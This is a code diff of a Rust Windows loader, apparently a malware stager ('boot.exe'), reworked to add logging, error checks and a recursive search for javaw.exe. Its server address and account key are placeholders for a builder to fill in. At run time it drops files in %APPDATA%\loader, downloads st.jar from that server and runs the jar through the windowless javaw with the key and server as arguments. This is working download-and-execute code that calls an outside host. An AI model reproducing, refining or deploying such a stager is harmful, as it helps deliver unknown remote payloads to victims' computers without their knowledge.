@@ -3,41 +3,61 @@
 
 use std::ffi::OsStr;
 use std::fs;
+use std::io::Write;
 use std::os::windows::ffi::OsStrExt;
 use std::path::{Path, PathBuf};
+use walkdir::WalkDir;
 
 use windows_sys::Win32::Foundation::*;
 use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::Networking::WinInet::*;
 
-const KEY: &str = "__ACCOUNT_KEY__"; // Injected by builder
-const SERVER: &str = "__SERVER_IP__"; // Injected by builder
+const KEY: &str = "__ACCOUNT_KEY__";
+const SERVER: &str = "__SERVER_IP__";
 
 fn to_wide(s: &str) -> Vec<u16> {
     OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
 }
 
-fn download_file(url: &str, dest: &Path) {
-    unsafe {
-        let agent = to_wide("Mozilla/5.0");
-        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_PRECONFIG, std::ptr::null(), std::ptr::null(), 0);
-        let url_w = to_wide(url);
-        let h_url = InternetOpenUrlW(h_internet, url_w.as_ptr(), std::ptr::null(), 0, 0, 0);
-        if !h_url.is_null() {
-            let mut buf = [0u8; 8192];
-            let mut bytes_read = 0;
-            let mut data = Vec::new();
-            while InternetReadFile(h_url, buf.as_mut_ptr() as _, 8192, &mut bytes_read) != 0 && bytes_read > 0 {
-                data.extend_from_slice(&buf[..bytes_read as usize]);
-            }
-            let _ = fs::write(dest, data);
-            InternetCloseHandle(h_url);
-        }
-        InternetCloseHandle(h_internet);
+fn log(loader: &Path, msg: &str) {
+    let path = loader.join("debug.txt");
+    if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(path) {
+        let _ = writeln!(f, "{}", msg);
     }
 }
 
-fn find_java() -> Option<PathBuf> {
+fn download_file(url: &str, dest: &Path, loader: &Path) -> bool {
+    log(loader, &format!("Downloading: {}", url));
+    unsafe {
+        let agent = to_wide("Mozilla/5.0");
+        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_PRECONFIG, std::ptr::null(), std::ptr::null(), 0);
+        if h_internet.is_null() { log(loader, "InternetOpenW failed"); return false; }
+
+        let url_w = to_wide(url);
+        let h_url = InternetOpenUrlW(h_internet, url_w.as_ptr(), std::ptr::null(), 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+        if h_url.is_null() { 
+            log(loader, "InternetOpenUrlW failed (Check server IP/URL)"); 
+            InternetCloseHandle(h_internet); 
+            return false; 
+        }
+
+        let mut buf = [0u8; 8192];
+        let mut bytes_read = 0;
+        let mut data = Vec::new();
+        while InternetReadFile(h_url, buf.as_mut_ptr() as _, 8192, &mut bytes_read) != 0 && bytes_read > 0 {
+            data.extend_from_slice(&buf[..bytes_read as usize]);
+        }
+        
+        log(loader, &format!("Downloaded {} bytes", data.len()));
+        
+        let success = fs::write(dest, data).is_ok();
+        InternetCloseHandle(h_url);
+        InternetCloseHandle(h_internet);
+        success
+    }
+}
+
+fn find_java(loader: &Path) -> Option<PathBuf> {
     let appdata = std::env::var("APPDATA").unwrap_or_default();
     let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
     
@@ -53,38 +73,45 @@ fn find_java() -> Option<PathBuf> {
     for base_path in paths {
         let path = Path::new(&base_path);
         if path.exists() {
-            if let Ok(entries) = fs::read_dir(path) {
-                for entry in entries.flatten() {
-                    let javaw = entry.path().join("bin").join("javaw.exe");
-                    if javaw.exists() { return Some(javaw); }
+            // Recursively search for javaw.exe in this directory
+            for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
+                if entry.file_name() == "javaw.exe" {
+                    log(loader, &format!("Found Java: {:?}", entry.path()));
+                    return Some(entry.path().to_path_buf());
                 }
             }
         }
     }
+    
+    log(loader, "Java not found in standard paths");
     None
 }
 
 fn main() {
-    // 1. Setup loader dir & key.json
     let appdata = std::env::var("APPDATA").unwrap_or_default();
     let loader = Path::new(&appdata).join("loader");
     let _ = fs::create_dir_all(&loader);
-    let _ = fs::write(loader.join("key.json"), format!("{{\"key\":\"{}\"}}", KEY));
+    
+    log(&loader, "--- STARTING BOOT.EXE ---");
 
-    // 2. Download st.jar
+    let _ = fs::write(loader.join("key.json"), format!("{{\"key\":\"{}\"}}", KEY));
+    log(&loader, "Wrote key.json");
+
     let jar_path = loader.join("st.jar");
     let url = format!("{}/api/downloads/st.jar", SERVER);
-    download_file(&url, &jar_path);
+    
+    if !download_file(&url, &jar_path, &loader) || !jar_path.exists() {
+        log(&loader, "Failed to download st.jar. Exiting.");
+        return;
+    }
 
-    if !jar_path.exists() { return; }
-
-    // 3. Find Java
-    let java_exe = match find_java() {
+    let java_exe = match find_java(&loader) {
         Some(p) => p,
-        None => return, // Or download JRE here if you want
+        None => return, 
     };
 
-    // 4. Run it
+    log(&loader, &format!("Launching Java with: {:?}", java_exe));
+
     unsafe {
         let mut si: STARTUPINFOW = std::mem::zeroed();
         si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
@@ -95,7 +122,7 @@ fn main() {
         let cmd_str = format!("\"{}\" -jar \"{}\" {} {}", java_exe.display(), jar_path.display(), KEY, SERVER);
         let mut cmd_line = to_wide(&cmd_str);
 
-        CreateProcessW(
+        let success = CreateProcessW(
             std::ptr::null(), 
             cmd_line.as_mut_ptr(), 
             std::ptr::null(), 
@@ -107,7 +134,13 @@ fn main() {
             &si, 
             &mut pi,
         );
-        if !pi.hProcess.is_null() { CloseHandle(pi.hProcess); }
-        if !pi.hThread.is_null() { CloseHandle(pi.hThread); }
+
+        if success != 0 {
+            log(&loader, "Successfully spawned javaw.exe");
+            if !pi.hProcess.is_null() { CloseHandle(pi.hProcess); }
+            if !pi.hThread.is_null() { CloseHandle(pi.hThread); }
+        } else {
+            log(&loader, "CreateProcessW failed");
+        }
     }
 }
